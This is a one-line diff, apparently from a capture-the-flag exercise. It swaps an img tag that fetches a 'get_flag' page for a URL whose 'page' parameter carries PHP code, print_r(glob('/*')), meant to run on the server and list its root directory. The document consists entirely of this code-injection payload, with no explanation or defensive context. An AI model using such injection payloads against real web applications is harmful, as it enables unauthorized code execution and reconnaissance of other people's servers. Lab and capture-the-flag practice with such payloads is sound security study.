@@ -1,1 +1,1 @@
-<img src=$WEBROOTcheck_webpage.php?page=get_flag />
+$WEBROOTcheck_webpage.php?page=print_r(glob('/*'));
